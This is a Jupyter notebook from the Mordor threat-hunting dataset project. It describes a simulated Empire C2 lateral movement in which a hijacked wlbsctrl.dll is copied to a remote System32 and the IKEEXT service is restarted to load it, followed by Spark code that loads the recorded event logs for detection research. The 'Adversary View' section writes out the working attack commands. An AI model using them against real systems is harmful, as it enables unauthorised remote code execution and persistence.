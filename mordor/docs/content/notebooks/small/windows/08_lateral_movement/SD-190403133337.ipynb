{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SCM and Dll Hijacking IKEEXT"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190403133337 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/04/03 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script |  |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_scm_dll_hijack_ikeext.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries copying a file remotely to replace the wlbsctrl.dll file which is executed by the IKEEXT (vulnerable to DLL hijack)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: NZB6SE34) > upload /tmp/wlbsctrl.dll\n",
    "[*] Tasked agent to upload wlbsctrl.dll, 124 KB\n",
    "[*] Tasked NZB6SE34 to run TASK_UPLOAD\n",
    "[*] Agent NZB6SE34 tasked with task ID 46\n",
    "(Empire: NZB6SE34) > shell COPY .\\wlbsctrl.dll \\\\HR001\\C$\\Windows\\System32\\wlbsctrl.dll\n",
    "[*] Tasked NZB6SE34 to run TASK_SHELL\n",
    "[*] Agent NZB6SE34 tasked with task ID 47\n",
    "(Empire: NZB6SE34) > ..Command execution completed.\n",
    "\n",
    "(Empire: NZB6SE34) > shell sc.exe `\\`\\HR001 stop IKEEXT\n",
    "[*] Tasked NZB6SE34 to run TASK_SHELL\n",
    "[*] Agent NZB6SE34 tasked with task ID 48\n",
    "(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT \n",
    "      TYPE               : 30  WIN32  \n",
    "      STATE              : 3  STOP_PENDING \n",
    "                              (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n",
    "      WIN32_EXIT_CODE    : 0  (0x0)\n",
    "      SERVICE_EXIT_CODE  : 0  (0x0)\n",
    "      CHECKPOINT         : 0x0\n",
    "      WAIT_HINT          : 0x1388\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: NZB6SE34) > shell sc.exe `\\`\\HR001 query IKEEXT\n",
    "[*] Tasked NZB6SE34 to run TASK_SHELL\n",
    "[*] Agent NZB6SE34 tasked with task ID 49\n",
    "(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT \n",
    "      TYPE               : 20  WIN32_SHARE_PROCESS  \n",
    "      STATE              : 1  STOPPED \n",
    "      WIN32_EXIT_CODE    : 0  (0x0)\n",
    "      SERVICE_EXIT_CODE  : 0  (0x0)\n",
    "      CHECKPOINT         : 0x0\n",
    "      WAIT_HINT          : 0x0\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: NZB6SE34) > shell sc.exe `\\`\\HR001 start IKEEXT\n",
    "[*] Tasked NZB6SE34 to run TASK_SHELL\n",
    "[*] Agent NZB6SE34 tasked with task ID 50\n",
    "(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT \n",
    "      TYPE               : 30  WIN32  \n",
    "      STATE              : 2  START_PENDING \n",
    "                              (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n",
    "      WIN32_EXIT_CODE    : 0  (0x0)\n",
    "      SERVICE_EXIT_CODE  : 0  (0x0)\n",
    "      CHECKPOINT         : 0x0\n",
    "      WAIT_HINT          : 0x7d0\n",
    "      PID                : 4500\n",
    "      FLAGS              : \n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: NZB6SE34) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_scm_dll_hijack_ikeext.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
